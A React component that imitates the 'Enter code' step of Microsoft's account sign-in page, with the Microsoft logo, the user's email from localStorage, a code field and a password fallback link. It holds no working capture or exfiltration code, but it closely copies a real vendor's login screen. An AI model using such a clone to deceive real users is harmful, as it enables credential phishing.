import logo from './img/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg';
import './App.css';
import arrow from './img/arrow_left_43280e0ba671a1d8b5e34f1931c4fe4b (2).svg'
import { Link } from "react-router-dom";

function Code() {
  const email = localStorage.getItem("email");
  return (
    <>
        <div className="container">
      <div className="container2">
        <img className="logo" src={logo} alt="logo"/>
        <p style={{color: 'black', fontSize:'18px'}}><Link to='/'><img src={arrow} id='arrow' alt='left-arrow'/></Link>{email}</p>
        <h2  style={{fontSize:'24px', fontWeight:'600',height:'28px', width:'352px', textDecoration: 'none solid rgb(27,27,27)'}}>
            Enter code
        </h2>
        <p style={{color: 'black', fontSize:'18px'}}>We emailed a code to <br/> {email}. Please enter the code to sign in.</p>
        <input id="myInput" type="text" placeholder="Enter code"/>
        <br/>
        <p style={{marginBottom: '0px', fontSize:'15px'}}>
        <Link to="/password" id="link" style={{color: '#0067b8'}}>
                Use your password instead
            </Link>
        </p>
        <div>
          <Link to="">
            <button type="button" id="next">Sign in</button>
          </Link>
        </div>
    
      </div>
    
    </div>
    
    <div className="footer">
      <div className="footer-links">
        <Link className="footer-text" to="#">Terms of use</Link>
        <Link className="footer-text" to="#">Privacy & cookies</Link>
        <Link className="footer-text" to="">. . .</Link>
      </div>
    </div>
    </>
  )
}

export default Code;